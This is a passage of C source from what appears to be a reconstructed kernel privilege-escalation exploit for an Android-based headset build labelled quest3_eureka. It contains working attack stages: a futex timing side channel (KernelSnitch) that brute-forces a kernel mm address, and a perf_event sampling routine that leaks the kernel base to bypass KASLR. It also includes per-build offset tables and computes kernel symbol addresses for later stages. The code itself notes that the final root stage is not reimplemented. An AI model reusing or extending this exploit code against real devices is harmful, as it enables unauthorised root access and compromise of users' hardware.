    if (*KS_P(KS_VERBOSE)) puts("\x1B[33m[*] \x1B[0mstart bruteforcing");
    
    cpu_set_t all;
    CPU_ZERO(&all);
    for (int i = 0; i < 1024; i++) CPU_SET(i, &all);
    if (sched_setaffinity(0, sizeof(all), &all) == -1)
        printf("\x1B[31m[-] \x1B[0mreset_cpu_pin failed: %m (continuing)\n");

    unsigned long long n = *KS_P(KS_THREADS);
    struct mm_leak_arg **args = calloc(n, sizeof(*args));
    if (!args) { printf("\x1B[31m[!] \x1B[0mSYSCHK(calloc(ks->thread_cnt, sizeof(*args))): %m\n"); exit(-1); }
    unsigned long long id_start = *KS_P(KS_ID_START), id_end = *KS_P(KS_ID_END);
    unsigned long long span = *KS_P(KS_SPAN);
    for (unsigned long long i = 0; i < n; i++) {
        struct mm_leak_arg *arg = calloc(1, sizeof(*arg));
        args[i] = arg;
        unsigned long long lo = id_start + span * i, hi = lo + span;
        arg->ks = a1; arg->idx = i; arg->start = lo; arg->end = hi;
        if ((lo & 0x3FFFFFFF) != 0) arg->start = lo & 0xFFFFFFFFC0000000ull;
        if ((hi & 0x3FFFFFFF) != 0) arg->end = (hi & 0xFFFFFFFFC0000000ull) + 0x40000000;
        if (pthread_create((pthread_t *)(*KS_P(KS_TIDS)) + i, NULL, __mm_leak, arg) == -1) {
            printf("\x1B[31m[!] \x1B[0mSYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg)): %m\n");
            exit(-1);
        }
    }
    for (unsigned long long i = 0; i < n; i++)
        pthread_join(((pthread_t *)*KS_P(KS_TIDS))[i], NULL);

    struct mm_leak_arg *best = NULL;
    if (!*(unsigned int *)((char *)ks + KS_MTE) && *KS_P(KS_CORR_COUNT)) {
        *KS_P(KS_CAND_COUNT) = 0;
        for (unsigned long long i = 0; i < n; i++) {
            struct mm_leak_arg *cur = args[i];
            if (!best || cur->best_count > best->best_count ||
                (cur->best_count == best->best_count && cur->best_sum > best->best_sum))
                best = cur;
            
            if (cur->count) {
                for (unsigned long long k = 0; k < cur->count && *KS_P(KS_CAND_COUNT) < 0x100; k++) {
                    *(unsigned long long *)((char *)ks + KS_CAND_LIST + 8 * (*KS_P(KS_CAND_COUNT))++) =
                        cur->cand_addrs[k];
                }
            }
        }
        if (best && best->best_count >= *KS_P(KS_COLLISIONS) - 1) {
            *KS_P(KS_MM) = best->best_addr;
            *KS_P(KS_CORR_MATCH) = best->best_count;
            unsigned long long *coll = (unsigned long long *)*KS_P(KS_COLL_ARR);
            for (unsigned long long i = 1; i < *KS_P(KS_COLLISIONS); i++)
                coll[i] = best->src[i - 1];
            *KS_P(KS_MM_FOUND) = 1;
        }
    }
    for (unsigned long long i = 0; i < n; i++) free(args[i]);
    free(args);
    *(unsigned int *)((char *)ks + KS_STATE) =
        *KS_P(KS_MM) == (unsigned long long)-1 ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

static unsigned long long kernelsnitch_cleanup(unsigned long long a1) {
    unsigned int st = *(unsigned int *)((char *)ks + KS_STATE);
    if (st != KERNELSNITCH_MM_FOUND && st != KERNELSNITCH_MM_NOT_FOUND)
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): wrong state\n",
               "(ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)");
    munmap((void *)*KS_P(KS_TIMES), 8 * *KS_P(KS_TOTAL_FUTEXES));
    munmap((void *)*KS_P(KS_TIDS), 8 * *KS_P(KS_THREADS));
    munmap((void *)*KS_P(KS_COLL_ARR), 8 * *KS_P(KS_COLLISIONS) + 8);
    munmap((void *)*KS_P(KS_FUTEXES), 0x1000000000ull);
    if (*KS_P(KS_VERBOSE)) puts("\x1B[33m[*] \x1B[0mdone");
    unsigned long long mm = *KS_P(KS_MM);
    munmap((void *)a1, 0x1D58);
    return mm;
}

static unsigned long long ks_threads(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    char *e = getenv("IONSTACK_KS_THREADS");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end) printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_THREADS", e, n);
        else return v;
    }
    return n;
}

static unsigned long long setup_kernelsnitch(void) {
    unsigned long long mm_size = 1024;
    char *e = getenv("IONSTACK_KS_MM_SIZE");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end) {
            mm_size = 1024;
            printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_MM_SIZE", e, 0x400ull);
        } else mm_size = v;
    }
    unsigned long long order = 2;
    e = getenv("IONSTACK_KS_ORDER");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end) {
            order = 2;
            printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_ORDER", e, 2u);
        } else order = v;
    }
    unsigned long long threads = ks_threads();
    unsigned long long collisions = 4;
    e = getenv("IONSTACK_KS_COLLISIONS");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end) {
            collisions = 4;
            printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_COLLISIONS", e, 4u);
        } else collisions = v;
    }
    unsigned long long verbose = 0;
    e = getenv("IONSTACK_KS_VERBOSE");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) verbose = v;
        else printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_VERBOSE", e, 0);
    }
    int mte = 0;
    e = getenv("IONSTACK_KS_MTE");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) mte = (int)v;
        else printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_KS_MTE", e, 0);
    }
    ks = kernelsnitch_setup(mm_size, order, threads, collisions, verbose, mte);
    return printf("\x1B[33m[*] \x1B[0mks %s cfg mm_size=%zx order=%zu threads=%zu collisions=%zu stride=%zx obj_off=%zx total_futexes=%zu sample_hash=%zu local_hash=%lu id=%016llx-%016llx correlate_top=%zu verbose=%zu mte=%d\n",
                  "setup", ks[0], ks[3], ks[6], ks[5], ks[1], ks[2], ks[9], ks[8], futex_hashsize,
                  ks[936], ks[937], ks[536], ks[4], *(int *)((char *)ks + KS_MTE));
}

static void log_kernelsnitch_collisions(const char *tag) {
    unsigned long long wanted = *KS_P(KS_COLLISIONS);
    unsigned long long *coll = (unsigned long long *)*KS_P(KS_COLL_ARR);
    unsigned long long first = 0, second = 0, third = 0, fourth = 0;
    if (wanted) {
        first = coll[0];
        if (wanted > 1) second = coll[1];
        if (wanted > 2) third = coll[2];
        if (wanted > 3) fourth = coll[3];
    }
    printf("\x1B[33m[*] \x1B[0mks %s collisions state=%d wanted=%zu first=%016zx second=%016zx third=%016zx fourth=%016zx approx=%zu threshold=%zu mult=%zu appended=%zu scanned=%zu detected=%zu max=%zu@%016zx min_selected=%zu correlate_top=%zu correlate_count=%zu correlate_match_count=%zu\n",
           tag, *(unsigned int *)((char *)ks + KS_STATE), wanted, first, second, third, fourth,
           *KS_P(KS_APPROX), *KS_P(KS_THRESHOLD), *KS_P(KS_MULT), *KS_P(KS_APPENDED),
           *KS_P(KS_SCANNED), *KS_P(KS_DETECTED), *KS_P(KS_MAX), *KS_P(KS_MAX_ADDR),
           *KS_P(KS_MIN_SELECTED), *KS_P(KS_CORR_TOP), *KS_P(KS_CORR_COUNT), *KS_P(KS_CORR_MATCH));
}

static long long run_kernelsnitch_bruteforce(void) {
    kernelsnitch_bruteforce((unsigned long long)ks);
    unsigned long long n = *KS_P(KS_CAND_COUNT);
    unsigned long long *c = (unsigned long long *)((char *)ks + KS_CAND_LIST);
    printf("\x1B[33m[*] \x1B[0mks %s mm state=%d found=%zu mm=%016zx size=%zx stride=%zx obj_off=%zx order=%zu correlate_match_count=%zu candidates=%zu c0=%016zx c1=%016zx c2=%016zx c3=%016zx\n",
           "bruteforce", *(unsigned int *)((char *)ks + KS_STATE), *KS_P(KS_MM_FOUND), *KS_P(KS_MM),
           ks[0], ks[1], ks[2], ks[3], *KS_P(KS_CORR_MATCH), n,
           n ? c[0] : 0, n > 1 ? c[1] : 0, n > 2 ? c[2] : 0, n > 3 ? c[3] : 0);
    return 0;
}

static int clone_leak_child(void) {
    long r = syscall(SYS_CLONE, 17, 0, 0, 0, 0);
    if (r == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0)): %m\n");
        exit(-1);
    }
    if (!(int)r) {
        if (prctl(4, 1) != -1) { 
            kernelsnitch_find_collisions((unsigned long long)ks);
            exit(0);
        }
        printf("\x1B[31m[!] \x1B[0mSYSCHK(prctl(PR_SET_DUMPABLE, 1)): %m\n");
        exit(-1);
    }
    return (int)r;
}

static void kill_child(long long pid) {
    if ((int)pid >= 1) {
        if (kill((int)pid, 9) < 0 && errno != 3) {
            printf("\x1B[31m[!] \x1B[0mkill(%d): %m\n", (int)pid);
            exit(-1);
        } else {
            if (waitpid((int)pid, NULL, 0) >= 0) return;
            if (errno == 10) return;
            printf("\x1B[31m[!] \x1B[0mwaitpid(%d): %m\n", (int)pid);
        }
        exit(-1);
    }
}

static long long run_kernelsnitch_probe_once(void) {
    setup_kernelsnitch();
    int child = clone_leak_child();
    if (waitpid(child, NULL, 0) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(waitpid(child, NULL, 0)): %m\n");
        exit(-1);
    }
    log_kernelsnitch_collisions("ready");
    unsigned int st = *(unsigned int *)((char *)ks + KS_STATE);
    if (st != KERNELSNITCH_COLLISIONS_FOUND && st != KERNELSNITCH_COLLISIONS_NOT_FOUND)
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): wrong state\n",
               "(ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND)");
    if (st != KERNELSNITCH_COLLISIONS_FOUND) return -1;
    run_kernelsnitch_bruteforce();
    long long mm = kernelsnitch_cleanup((unsigned long long)ks);
    ks = 0;
    return mm;
}




static unsigned long long slide_perf_leak_kernel_base(void) {
    int fd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY);
    char buf[32];
    const char *label = "unreadable:";
    long val = 0;
    if (fd >= 0) {
        ssize_t n = read(fd, buf, 0x1F);
        close(fd);
        if (n > 0) {
            buf[n] = 0;
            char *end = NULL;
            errno = 0;
            long v = strtol(buf, &end, 10);
            if (!errno && end != buf) { label = ""; val = v; }
        }
    }
    printf("\x1B[33m[*] \x1B[0mslide perf perf_event_paranoid=%s%ld (need <= 1 for kernel-mode sampling)\n", label, val);

    pid_t pid = fork();
    if (pid < 0) {
        printf("\x1B[31m[-] \x1B[0mslide perf fork failed errno=%d\n", errno);
        return 0;
    }
    if (pid == 0) {
        
        syscall(167, 1, 9, 0, 0, 0);
        while (1) syscall(172);
    }

    struct {
        uint32_t type, size;
        uint64_t config, sample_period, sample_type, read_format, flags;
        uint64_t rest[12];
    } attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = 1;          
    attr.size = 0x90;
    attr.config = 1;        
    attr.sample_period = 10;
    attr.sample_type = 1;   
    attr.flags = 0x51;      

    int pfd = syscall(SYS_PERF_EVENT_OPEN, &attr, pid, -1, -1, 0);
    if (pfd < 0) {
        int e = errno;
        printf("\x1B[31m[-] \x1B[0mslide perf perf_event_open failed errno=%d%s\n", e,
               (e == 1 || e == 13) ? " -- perf_event_paranoid is too high for kernel-mode sampling" : "");
        kill(pid, 9); waitpid(pid, NULL, 0);
        return 0;
    }
    char *ring = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
    if (ring == (char *)-1) {
        printf("\x1B[31m[-] \x1B[0mslide perf mmap failed errno=%d\n", errno);
        close(pfd); kill(pid, 9); waitpid(pid, NULL, 0);
        return 0;
    }
    if (ioctl(pfd, 0x2400) != 0) { 
        printf("\x1B[31m[-] \x1B[0mslide perf ioctl enable failed errno=%d\n", errno);
        munmap(ring, 0x2000); close(pfd); kill(pid, 9); waitpid(pid, NULL, 0);
        return 0;
    }
    char *data = ring + 4096;
    unsigned long long want = 300;
    char *e = getenv("IONSTACK_PERF_SAMPLES");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end || !v) {
            want = 300;
            printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zu\n", "IONSTACK_PERF_SAMPLES", e, 0x12Cu);
        } else want = v;
    }
    unsigned long long samples = 0, spins = 0, distinct = 0;
    unsigned long long ips[8];
    unsigned long long pos = 0, last_head = 0;

    while (1) {
        unsigned long long head = *(volatile unsigned long long *)(ring + 1024); 
        __asm__ __volatile__("dmb ishld" ::: "memory");
        if (head == last_head) {
            spins++;
            if (spins >= 0x3D0900) break;
            last_head = head;
            if (samples >= want) break;
            continue;
        }
        unsigned long long ns = samples;
        while (pos < head) {
            unsigned long long p = pos & 0xFFF;
            unsigned long long hdr;
            if (p > 0xFF8) {
                unsigned long long rem = 4096 - p;
                memcpy(&hdr, &data[p], rem);
                memcpy((char *)&hdr + rem, data, p - 4088);
            } else {
                hdr = *(unsigned long long *)&data[p];
            }
            unsigned int size = (unsigned int)(hdr >> 48) & 0xFFFF;
            if (size < 8) { pos = head; break; }
            if (size > 0x1000 || (size & 7) != 0) { pos = head; break; }
            if (size >= 0x10 && (unsigned int)hdr == 9) { 
                unsigned long long q = ((pos + 8) & 0xFFF);
                unsigned long long ip;
                if (q > 0xFF8) {
                    unsigned long long rem = 4096 - q;
                    memcpy(&ip, &data[q], rem);
                    memcpy((char *)&ip + rem, data, q - 4088);
                } else {
                    ip = *(unsigned long long *)&data[q];
                }
                if (ip >= 0xFFFF000000000000ull) {
                    ns++;
                    if (distinct) {
                        unsigned long long k = 0;
                        while (k < distinct && ips[k] != ip) k++;
                        if (k == distinct) {
                            if (distinct > 7) {
                                if (ip >= ips[7]) {  }
                                else {
                                    ips[7] = ip;
                                    
                                    for (unsigned long long j = 7; j > 0 && ips[j] < ips[j - 1]; j--) {
                                        unsigned long long t = ips[j]; ips[j] = ips[j - 1]; ips[j - 1] = t;
                                    }
                                }
                            } else {
                                ips[distinct++] = ip;
                                for (unsigned long long j = distinct - 1; j > 0 && ips[j] < ips[j - 1]; j--) {
                                    unsigned long long t = ips[j]; ips[j] = ips[j - 1]; ips[j - 1] = t;
                                }
                            }
                        }
                    } else {
                        ips[0] = ip;
                        distinct = 1;
                    }
                }
            }
            pos += size;
        }
        __asm__ __volatile__("dmb ishld" ::: "memory");
        samples = ns;
        *(unsigned long long *)(ring + 1032) = pos; 
        if (samples >= want) break;
        last_head = head;
    }
    ioctl(pfd, 0x2401); 
    munmap(ring, 0x2000);
    close(pfd);
    kill(pid, 9);
    waitpid(pid, NULL, 0);

    printf("\x1B[33m[*] \x1B[0mslide perf collected samples=%zu spins=%zu distinct_low=%zu\n", samples, spins, distinct);
    if (!samples || !distinct) {
        puts("\x1B[31m[-] \x1B[0mslide perf no samples collected");
        return 0;
    }
    unsigned long long best_base = 0, best_votes = 0, best_skid = 0, lowest_ip = 0;
    int valid_candidate = 0;
    for (unsigned long long i = 0; i < distinct; i++) {
        unsigned long long ip = ips[i];
        if (ip < 0xFFFFFFC008000000ull || (ip + 0xFF8000000ull) < 0xFFFFFFE000000000ull) {
            printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx rejected (alignment or slide range)\n", i, ip);
            continue;
        }
        unsigned long long base = ip & 0xFFFFFFFFFFE00000ull;
        unsigned long long votes = 0;
        for (unsigned long long k = 0; k < distinct; k++) {
            if (ips[k] >= base && ips[k] - base < 0x200000) votes++;
        }
        printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx base=%016llx slide=%016llx skid=%016llx votes=%zu/%zu\n",
               i, ip, base, base + 0x3FF8000000ull, ip & 0x1FFFFF, votes, distinct);
        if (votes > best_votes) {
            best_base = base;
            best_votes = votes;
            best_skid = ip & 0x1FFFFF;
            lowest_ip = ip;
        }
        valid_candidate = 1;
    }
    if (best_votes > 1) {
        printf("\x1B[32m[+] \x1B[0mslide-perf-candidate ok=1 min_ip=%016llx candidate_base=%016llx slide=%016llx skid=%016llx votes=%zu/%zu samples=%zu\n",
               lowest_ip, best_base, best_base + 0x3FF8000000ull, best_skid, best_votes, distinct, samples);
        return best_base;
    }
    printf("\x1B[31m[-] \x1B[0mslide perf no base won the vote (lowest ip=%016llx distinct_low=%zu samples=%zu valid_candidate=%d best_votes=%zu/%d) -- valid_candidate=1 means the low IPs disagreed, not that perf sampling failed\n",
           ips[0], distinct, samples, valid_candidate, best_votes, 2);
    return 0;
}

static int slide_perf_leak_kernel_base_route(void) {
    unsigned long long v = slide_perf_leak_kernel_base();
    if (!v) return 0;
    kaslr_base = v;
    kaslr_slide = v + 0x3FF8000000ull;
    kaslr_done = 1;
    printf("\x1B[32m[+] \x1B[0mslide-kaslr-ok source=perf pid=%d base=%016llx slide=%016llx\n",
           getpid(), kaslr_base, kaslr_slide);
    return 1;
}

static int slide_leak_kernel_base(void) {
    char *e = getenv("IONSTACK_SLIDE_SOURCE");
    if (e && *e && strcmp(e, "perf"))
        printf("\x1B[31m[-] \x1B[0munknown IONSTACK_SLIDE_SOURCE=%s; using the perf route\n", e);
    unsigned long long v = slide_perf_leak_kernel_base();
    if (!v) return 0;
    kaslr_base = v;
    kaslr_slide = v + 0x3FF8000000ull;
    kaslr_done = 1;
    printf("\x1B[32m[+] \x1B[0mslide-kaslr-ok source=perf pid=%d base=%016llx slide=%016llx\n",
           getpid(), kaslr_base, kaslr_slide);
    return 1;
}




static void cfi_restore_on_signal(int sig) {
    
    _exit(sig + 128);
}

static int cfi_install_restore_guard(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = cfi_restore_on_signal;
    sigaction(15, &sa, NULL);
    sigaction(2, &sa, NULL);
    sigaction(1, &sa, NULL);
    signal(13, SIG_IGN);
    sigaction(11, &sa, NULL);
    sigaction(7, &sa, NULL);
    sigaction(6, &sa, NULL);
    return sigaction(8, &sa, NULL);
}

static void disable_rseq_for_thread(void) { }

static int log_startup_context(void) {
    char attr[256], enforce[32], status[4096];
    read_first_line("/proc/self/attr/current", attr, sizeof(attr));
    read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
    char s[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, status, sizeof(status) - 1);
        close(fd);
        if (n >= 1) {
            status[n] = 0;
            char a[32] = "?", b[32] = "?", c[32] = "?";
            char *p = strstr(status, "NoNewPrivs:");
            if (p) {
                p += 11;
                while (*p == ' ' || *p == '\t') p++;
                size_t l = strcspn(p, "\r\n");
                if (l >= 31) l = 31;
                memcpy(a, p, l); a[l] = 0;
            }
            p = strstr(status, "Seccomp:");
            if (p) {
                p += 8;
                while (*p == ' ' || *p == '\t') p++;
                size_t l = strcspn(p, "\r\n");
                if (l >= 31) l = 31;
                memcpy(b, p, l); b[l] = 0;
            }
            p = strstr(status, "Seccomp_filters:");
            if (p) {
                p += 16;
                while (*p == ' ' || *p == '\t') p++;
                size_t l = strcspn(p, "\r\n");
                if (l >= 31) l = 31;
                memcpy(c, p, l); c[l] = 0;
            }
            snprintf(s, sizeof(s), "NoNewPrivs=%s Seccomp=%s Seccomp_filters=%s", a, b, c);
        }
    }
    printf("\x1B[32m[+] \x1B[0mstartup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
           getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
    printf("\x1B[32m[+] \x1B[0mstartup limits pid=%d %s\n", getpid(), s);
    printf("\x1B[32m[+] \x1B[0mbuild config pid=%d label=%s slide=pselect main=pselect\n", getpid(), "quest3_eureka");
    unsigned long long envc = 0;
    if (environ) {
        for (char **e = environ; *e; e++)
            if (!strncmp(*e, "IONSTACK_", 9)) {
                printf("\x1B[33m[*] \x1B[0mstartup env %s\n", *e);
                envc++;
            }
    }
    printf("\x1B[32m[+] \x1B[0mstartup env count=%zu (only IONSTACK_* shown; absent means the built-in default applied)\n", envc);
    return printf("\x1B[32m[+] \x1B[0mp0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx delta=%016llx\n",
                  getpid(), 0x80000000ull, 2818506752ull, 671023104ull);
}

static int check_device_table(void) {
    struct utsname name;
    int uname_rc = uname(&name);
    const char *release = *(const char **)g_ionstack_dev;
    const char *incremental = *(const char **)(g_ionstack_dev + 8);
    int allow = 0;
    if (!uname_rc && !strcmp(name.release, release)) {
        char inc[92];
        memset(inc, 0, sizeof(inc));
        int n = __system_property_get("ro.build.version.incremental", inc);
        if (n <= 0) {
            printf("\x1B[31m[-] \x1B[0mdevice-table %s incremental=UNREADABLE (table pins %s) -- the release string alone does not identify this build\n",
                   "quest3_eureka", incremental);
        } else if (!strcmp(inc, incremental)) {
            printf("\x1B[32m[+] \x1B[0mdevice-table %s incremental match=1 %s\n", "quest3_eureka", inc);
            printf("\x1B[32m[+] \x1B[0mdevice-table %s match=1 release=%s\n", "quest3_eureka", name.release);
            return 1;
        } else {
            printf("\x1B[31m[-] \x1B[0mdevice-table %s release matches but incremental does NOT: running=%s table=%s. On this device several incrementals share one kernel release and their DATA symbols differ; OFFSETS ARE FOR A DIFFERENT BUILD\n",
                   "quest3_eureka", inc, incremental);
        }
    }
    char *e = getenv("IONSTACK_ALLOW_TABLE_MISMATCH");
    if (e) {
        if (*e) {
            char *end = NULL;
            errno = 0;
            unsigned long long v = strtoull(e, &end, 0);
            if (errno || !end || *end) {
                printf("\x1B[31m[-] \x1B[0minvalid %s=%s; using %zx\n", "IONSTACK_ALLOW_TABLE_MISMATCH", e, 0);
                v = 0;
            }
            allow = v != 0;
        } else allow = 0;
    }
    if (uname_rc) {
        printf("\x1B[31m[-] \x1B[0mdevice-table %s match=? uname failed errno=%d -- cannot verify the table against the running kernel%s\n",
               "quest3_eureka", errno, allow ? ", proceeding (override)" : "");
        if (allow) return allow;
    } else {
        printf("\x1B[31m[-] \x1B[0mdevice-table %s match=0 running=%s table=%s -- OFFSETS ARE FOR A DIFFERENT BUILD%s\n",
               "quest3_eureka", name.release, release, allow ? ", proceeding (override)" : "");
    }
    printf("\x1B[31m[-] \x1B[0mdevice-table %s REFUSING to run: wrong offsets panic or wedge the device rather than failing cleanly. Re-derive the table, or set IONSTACK_ALLOW_TABLE_MISMATCH=1 to override.\n",
           "quest3_eureka");
    fflush(stdout);
    fsync(1);
    return allow;
}

static int ionstack_universal_select(void) {
    struct utsname name;
    if (uname(&name)) {
        printf("\x1B[31m[-] \x1B[0muniversal: uname() failed errno=%d : cannot identify the running build, REFUSING to avoid crash\n", errno);
    } else {
        char inc[92];
        memset(inc, 0, sizeof(inc));
        if (__system_property_get("ro.build.version.incremental", inc) <= 0) {
            printf("\x1B[31m[-] \x1B[0muniversal: ro.build.version.incremental UNREADABLE -- this device (%s, release=%s) keys on incremental, and the release alone does not identify the build. REFUSING.\n",
                   "quest3_eureka", name.release);
        } else {
            unsigned long long i = 0;
            for (; i < 92; i++) {
                if (!ionstack_universal_tables[i][1] ||
                    !strcmp((const char *)ionstack_universal_tables[i][1], inc))
                    break;
            }
            if (i < 92) {
                g_ionstack_dev = (unsigned long long)&ionstack_universal_tables[i];
                printf("\x1B[32m[+] \x1B[0muniversal: selected table %d/%zu %s incremental=%s release=%s\n",
                       (int)i, 92u, "quest3_eureka",
                       (const char *)ionstack_universal_tables[i][1],
                       (const char *)ionstack_universal_tables[i][0]);
                return 0;
            }
            printf("\x1B[31m[-] \x1B[0muniversal: no offset table for %s=%s among %zu tables (%s) -- REFUSING to run: wrong offsets panic or wedge the device rather than failing cleanly. Derive the overlay for this build and rebuild the universal binary.\n",
                   "incremental", inc, 92u, "quest3_eureka");
        }
    }
    g_ionstack_dev = 0;
    return 1;
}

static void init_ashmem_path(void) {
    char buf[128];
    int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, 0x7F);
        close(fd);
        if (n >= 1) {
            buf[n] = 0;
            buf[strcspn(buf, "\r\n")] = 0;
            char cand[256];
            snprintf(cand, sizeof(cand), "/dev/ashmem%s", buf);
            int t = open(cand, O_RDWR | O_CLOEXEC);
            if (t >= 0) {
                close(t);
                snprintf(ashmem_path, 256, "%s", cand);
                return;
            }
        }
    }
    struct stat st;
    if (stat("/dev/ashmem", &st)) return;
    if ((st.st_mode & 0xF000) != 0x2000) return; 
    DIR *d = opendir("/dev");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (strncmp(de->d_name, "ashmem", 6)) continue;
        if (!strcmp(de->d_name, "ashmem")) continue;
        char cand[256];
        snprintf(cand, sizeof(cand), "/dev/%s", de->d_name);
        struct stat st2;
        if (!stat(cand, &st2) && (st2.st_mode & 0xF000) == 0x2000 &&
            st2.st_gid == st.st_gid) {
            int t = open(cand, O_RDWR | O_CLOEXEC);
            if (t >= 0) {
                close(t);
                snprintf(ashmem_path, 256, "%s", cand);
                break;
            }
        }
    }
    closedir(d);
}




static int stage_not_reconstructed(const char *stage) {
    printf("\x1B[31m[!] \x1B[0mstage %s not available in this reconstruction: the reclaim/forge/root pipeline (prepare_good_kernel_page, routes, physrw, su install) was mapped in the RE report but not reimplemented\n", stage);
    return 1;
}

int main(int argc, char **argv) {
    const char *stage = NULL;
    char *e = getenv("IONSTACK_STAGE");
    if (e && *e) {
        stage = e;
    } else if (argc >= 2) {
        for (int i = 1; i < argc; i++) {
            if (!strncmp(argv[i], "--stage=", 8) && argv[i][8]) { stage = argv[i] + 8; break; }
        }
        if (!stage) stage = "full";
    } else {
        stage = "full";
    }
    ionstack_stage = stage;
    disable_rseq_for_thread();
    if (setvbuf(stdin, NULL, _IONBF, 0) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(setvbuf(stdin, NULL, _IONBF, 0)): %m\n");
        exit(-1);
    }
    if (setvbuf(stdout, NULL, _IONBF, 0) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(setvbuf(stdout, NULL, _IONBF, 0)): %m\n");
        exit(-1);
    }
    if (setvbuf(stderr, NULL, _IONBF, 0) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(setvbuf(stderr, NULL, _IONBF, 0)): %m\n");
        exit(-1);
    }
    if (ionstack_universal_select()) return 1;
    cfi_install_restore_guard();

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(getrlimit(RLIMIT_NOFILE, &r)): %m\n");
        exit(-1);
    }
    rl.rlim_cur = rl.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rl) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(setrlimit(RLIMIT_NOFILE, &r)): %m\n");
        exit(-1);
    }
    if (getrlimit(RLIMIT_NPROC, &rl) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(getrlimit(RLIMIT_NPROC, &r)): %m\n");
        exit(-1);
    }
    rl.rlim_cur = rl.rlim_max;
    if (setrlimit(RLIMIT_NPROC, &rl) == -1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(setrlimit(RLIMIT_NPROC, &r)): %m\n");
        exit(-1);
    }
    log_startup_context();
    if (!check_device_table()) return 1;
    init_ashmem_path();
    printf("\x1B[32m[+] \x1B[0mstage selected=%s\n", ionstack_stage);

    int dry = 0;
    e = getenv("IONSTACK_DRY_OFFSETS");
    if (e && *e && (*e != '0' || e[1])) dry = 1;
    for (int i = 1; i < argc; i++)
        if (!strcmp(argv[i], "--dry-offsets")) dry = 1;
    if (!dry && ionstack_stage && !strcmp(ionstack_stage, "dry")) dry = 1;

    if (dry) {
        printf("\x1B[32m[+] \x1B[0mdry ashmem path=%s\n", ashmem_path);
        printf("\x1B[32m[+] \x1B[0mdry offsets label=%s kimage=%016llx p0=%016llx phys=%llx load=%llx delta=%llx\n",
               "quest3_eureka", 0xFFFFFFC008000000ull, 0xFFFFFF8000000000ull,
               0x80000000ull, 2818506752ull, 671023104ull);
        unsigned long long K = 0xFFFFFFC008000000ull;
        unsigned long long slot = data_addr(*(unsigned long long *)(g_ionstack_dev + 88) + K);
        unsigned long long fops_d = data_addr(*(unsigned long long *)(g_ionstack_dev + 16) + K);
        unsigned long long fops_t = text_addr(*(unsigned long long *)(g_ionstack_dev + 16) + K);
        unsigned long long kc = data_addr(*(unsigned long long *)(g_ionstack_dev + 176) + K);
        unsigned long long apbo = data_addr(*(unsigned long long *)(g_ionstack_dev + 184) + K);
        printf("\x1B[32m[+] \x1B[0mdry aliases ashmem_misc_fops_slot=%016llx ashmem_fops_data=%016llx ashmem_fops_text=%016llx kmalloc_caches=%016llx anon_pipe_buf_ops=%016llx\n",
               slot, fops_d, fops_t, kc, apbo);
        unsigned long long v[8];
        for (int i = 0; i < 8; i++)
            v[i] = text_addr(*(unsigned long long *)(g_ionstack_dev + 24 + 8 * i) + K);
